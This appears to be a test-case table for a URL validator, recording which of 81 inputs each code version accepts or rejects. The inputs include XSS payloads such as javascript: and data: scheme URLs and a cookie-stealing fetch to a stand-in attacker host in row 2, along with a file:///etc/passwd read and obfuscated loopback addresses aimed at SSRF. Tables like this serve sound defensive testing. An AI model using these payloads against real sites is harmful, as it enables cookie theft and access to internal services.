| # | Input | Config | MAIN asserts | BRANCH asserts | MAIN.pristine | BRANCH.blocking | BRANCH.carveout |
|---|---|---|---|---|---|---|---|
| 1 | `javascript:alert(1)` | any | R | R | R | R | R |
| 2 | `javascript:fetch('//attacker/'+document.cookie)` | any | R | — | R | R | R |
| 3 | `JaVaScRiPt:alert(1)` | any | R | — | R | R | R |
| 4 | `JavaScript:alert(1)` | any | — | R | R | R | R |
| 5 | `JAVASCRIPT:alert(1)` | any | R | R | R | R | R |
| 6 | `\tjavascript:alert(1)` | any | R | R | R | R | R |
| 7 | `\njavascript:alert(1)` | any | R | R | R | R | R |
| 8 | ` javascript:alert(1)` | any | R | — | R | R | R |
| 9 | `  javascript:alert(1)  ` | any | — | R | R | R | R |
| 10 | `java\tscript:alert(1)` | any | R | R | R | R | R |
| 11 | `java\nscript:alert(1)` | any | R | — | R | R | R |
| 12 | `java\rscript:alert(1)` | any | R | — | R | R | R |
| 13 | `javascript:alert(1)` | any | R | — | R | R | R |
| 14 | `javascript://evil.com/%0aalert(1)` | any | R | — | R | R | R |
| 15 | `data:text/html,<script>alert(1)</script>` | any | R | R | R | R | R |
| 16 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | any | R | — | R | R | R |
| 17 | `data://evil.com/x` | any | R | — | R | R | R |
| 18 | `vbscript:msgbox(1)` | any | R | R | R | R | R |
| 19 | `blob:https://example.com/uuid` | any | R | — | R | R | R |
| 20 | `blob:https://example.com/abc` | any | — | R | R | R | R |
| 21 | `file:///etc/passwd` | any | R | R | R | R | R |
| 22 | `mailto:a@b.com` | any | R | — | R | R | R |
| 23 | `ftp://evil.com/x` | any | R | — | R | R | R |
| 24 | `ftp://example.com/x` | any | — | R | R | R | R |
| 25 | `ws://evil.com/x` | any | R | — | R | R | R |
| 26 | `wss://evil.com/x` | any | R | — | R | R | R |
| 27 | `httpx://evil.com/x` | any | R | — | R | R | R |
| 28 | `` | any | R | R | R | R | R |
| 29 | `   ` | any | — | R | R | R | R |
| 30 | `null` | any | R | R | R | R | R |
| 31 | `undefined` | any | R | R | R | R | R |
| 32 | `not-a-url` | any | R | — | R | R | R |
| 33 | `not a url` | any | — | R | R | R | R |
| 34 | `/relative/path` | any | R | R | R | R | R |
| 35 | `//evil.com/x` | any | R | — | R | R | R |
| 36 | `//example.com/x` | any | — | R | R | R | R |
| 37 | `http://` | any | R | — | R | R | R |
| 38 | `https://` | any | — | R | R | R | R |
| 39 | `http://[::1/x` | any | R | — | R | R | R |
| 40 | `http://exa mple.com` | any | R | — | R | R | R |
| 41 | `https://example.com:99999/x` | any | R | — | R | R | R |
| 42 | `https://github.com/o/r/pull/1` | any | A | — | A | A | A |
| 43 | `http://example.com/x` | **BOTH** | A | — | A | R | R |
| 44 | `HtTpS://example.com` | any | A | — | A | A | A |
| 45 | `https://example.com:8443/x` | any | A | — | A | A | A |
| 46 | `https://example.com/x?a=1&b=2#frag` | any | A | — | A | A | A |
| 47 | `https://user:pass@example.com/x` | any | A | — | A | R | R |
| 48 | `https://EXAMPLE.com/X` | any | A | — | A | A | A |
| 49 | `http://例え.jp/x` | **BOTH** | A | — | A | R | R |
| 50 | `http://[::1]/x` | **BOTH** | A | R | A | R | R |
| 51 | `http:/\\/\\evil.com` | **BOTH** | A | — | A | R | R |
| 52 | `http:/example.com` | **BOTH** | A | — | A | R | R |
| 53 | `http:example.com` | **BOTH** | A | — | A | R | R |
| 54 | `http://example.com/a b` | **BOTH** | A | — | A | R | R |
| 55 | `https://example.com/x\n` | any | A | — | A | A | A |
| 56 | `http://example.com/%zz` | **BOTH** | A | — | A | R | R |
| 57 | `https:///x` | any | A | — | A | A | A |
| 58 | `http://example.com/issues/1` | **BOTH** | — | R | A | R | R |
| 59 | `http://localhost.evil.example/x` | **BOTH** | — | R | A | R | R |
| 60 | `http://evil.example/?q=localhost` | **BOTH** | — | R | A | R | R |
| 61 | `http://localhost@evil.example/` | any | — | R | A | R | R |
| 62 | `http://evil.example\\@localhost/` | **BOTH** | — | R | A | R | R |
| 63 | `http://localhost。evil.example/` | **BOTH** | — | R | A | R | R |
| 64 | `http://localhost:8080/tasks/1` | **BOTH** | — | R | A | R | A |
| 65 | `http://127.0.0.1:3000/tasks/1` | **BOTH** | — | R | A | R | A |
| 66 | `http://0x7f000001/x` | **BOTH** | — | R | A | R | A |
| 67 | `http://2130706433/x` | **BOTH** | — | R | A | R | A |
| 68 | `http://127.1/x` | **BOTH** | — | R | A | R | A |
| 69 | `http://0177.0.0.1/x` | **BOTH** | — | R | A | R | A |
| 70 | `http://127．0．0．1/x` | **BOTH** | — | R | A | R | A |
| 71 | `http://0x7f000001:9200/api` | **BOTH** | — | R | A | R | A |
| 72 | `https://user:pass@evil.example/` | any | — | R | A | R | R |
| 73 | `https://ok.example@evil.example/` | any | — | R | A | R | R |
| 74 | `https://github.com@evil.example/` | any | — | R | A | R | R |
| 75 | `https://:pass@evil.example/` | any | — | R | A | R | R |
| 76 | `http://user:pass@localhost/` | any | — | R | A | R | R |
| 77 | `https://github.com/acme/repo/issues/12` | any | — | A | A | A | A |
| 78 | `HTTPS://github.com/acme/repo` | any | — | A | A | A | A |
| 79 | `  https://github.com/acme/repo  ` | any | — | A | A | A | A |
| 80 | `https://example.com` | any | — | A | A | A | A |
| 81 | `https://localhost:8443/x` | any | — | A | A | A | A |
